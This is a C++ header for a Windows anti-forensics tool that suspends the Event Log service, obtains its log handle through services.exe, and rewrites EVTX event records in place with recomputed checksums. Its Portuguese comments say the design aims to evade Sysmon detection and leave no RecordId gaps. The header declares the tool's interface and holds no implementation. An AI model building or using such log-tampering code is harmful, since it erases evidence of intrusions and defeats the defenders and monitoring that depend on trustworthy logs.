#pragma once

#include <windows.h>
#include <winevt.h>
#include <string>
#include <vector>
#include <set>

#define LAZY_IMPORTER_HARDENED_MODULE_CHECKS

#ifndef EVTX_SKIP_NT_DECLS
extern "C" {
	NTSTATUS NTAPI NtSuspendProcess( HANDLE );
	NTSTATUS NTAPI NtResumeProcess( HANDLE );
	NTSTATUS NTAPI NtDuplicateObject( HANDLE , HANDLE , HANDLE , PHANDLE , ACCESS_MASK , ULONG , ULONG );
	NTSTATUS NTAPI NtQuerySystemInformation( ULONG , PVOID , ULONG , PULONG );
	NTSTATUS NTAPI NtQueryObject( HANDLE , ULONG , PVOID , ULONG , PULONG );
}
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

#define stlen ((NTSTATUS)0xC0000004L)
#define hcls  16
#define ocls  1

typedef struct _ustr {
	USHORT len;
	USHORT max;
	PWSTR  buf;
} ustr;

typedef struct _he {
	USHORT pid;
	USHORT bti;
	UCHAR  oti;
	UCHAR  attr;
	USHORT val;
	PVOID  obj;
	ULONG  acc;
} he;

typedef struct _hi {
	ULONG cnt;
	he    ent [ 1 ];
} hi;

#pragma pack(push, 1)

struct fh {
	CHAR   magic [ 8 ];
	UINT64 fchunk;
	UINT64 lchunk;
	UINT64 nrid;
	UINT32 hsz;
	UINT16 minor;
	UINT16 major;
	UINT16 cdoff; // chunk data offset in file (= 0x1000); UINT16, not UINT32
	UINT16 cnt;
	BYTE   rsv [ 76 ];
	UINT32 flags;
	UINT32 crc;
};

struct ch {
	CHAR   magic [ 8 ];
	UINT64 frn;
	UINT64 lrn;
	UINT64 fri;
	UINT64 lri;
	UINT32 hsz;
	UINT32 ldo;
	UINT32 fso;
	UINT32 rcrc;
	BYTE   rsv [ 64 ];
	UINT32 flags;
	UINT32 crc;
};

struct rh {
	UINT32 magic;
	UINT32 sz;
	UINT64 rid;
	UINT64 ts;
};

#pragma pack(pop)

#define EVTX_COMMON_TYPES_DEFINED

class evtx {
public:
	evtx( );
	~evtx( );

	bool abre( const std::wstring& c );
	bool abre( );
	// repl / ra / rb : string substituta para a keyword (UTF-16LE, mesmo tamanho ou menor).
	// Se vazio (padrão) → preenche com espaços (comportamento original).
	// Se menor que a keyword → escreve repl e preenche o resto com espaços.
	// Se maior que a keyword → trunca para o tamanho da keyword.
	// O comprimento do prefixo UINT16 no binary XML NÃO é alterado — a substituição
	// é feita in-place, mantendo a estrutura válida e sem deslocar bytes adjacentes.
	int  limpa( const std::wstring& kw , const std::wstring& repl = L"" );
	int  limpa( const std::wstring& a , const std::wstring& b , const std::wstring& ra , const std::wstring& rb );
	void espera( DWORD ms = 5000 );
	void fecha( );

	bool pronto( ) const { return ok; }

private:
	bool         ok;
	DWORD        pid;
	HANDLE       hproc;
	HANDLE       hevt;
	std::wstring canal;

	bool   dbg( );
	DWORD  findpid( );
	// Obtém handle do processo targetPid via DuplicateHandle de services.exe,
	// sem abrir o processo alvo diretamente → sem Event ID 10 no Sysmon para o alvo.
	// services.exe (SCM) mantém handles PROCESS_ALL_ACCESS de todos os svchosts.
	HANDLE stealProc( DWORD targetPid , DWORD access );
	HANDLE duphdl( const std::wstring& sub );

	UINT32 ctab [ 256 ];
	void   initcrc( );
	UINT32 crc( const BYTE* d , size_t n , UINT32 init = 0xFFFFFFFF );
	UINT32 crcp( const BYTE* d , size_t n , UINT32 c = 0xFFFFFFFF );
	void   chcrc( BYTE* c );
	void   fhcrc( BYTE* d );

	std::set<UINT64> ids( const std::vector<std::wstring>& kw , int mode );
	int  compact( BYTE* c , const std::set<UINT64>& tg );
	int  proc( const std::set<UINT64>& tg );

	// BYPASS Hook Sysmon 1 / 0x01 / 0x04:
	// Ao invés de remover eventos (criando gaps de RecordId detectáveis por EvtQuery
	// e pelo scanner de fh.nrid vs max_rid), sobrescreve os bytes da keyword dentro
	// do event record em-lugar, mantendo o evento no chunk com seu RecordId intacto.
	int  neutralize( BYTE* c , const std::set<UINT64>& tg , const std::vector<std::wstring>& kws , const std::vector<std::wstring>& repls );
	int  proc_clean( const std::set<UINT64>& tg , const std::vector<std::wstring>& kws , const std::vector<std::wstring>& repls );

	static bool  contem( const std::wstring& hay , const std::wstring& ndl );
	std::wstring hsub( const std::wstring& c );
};
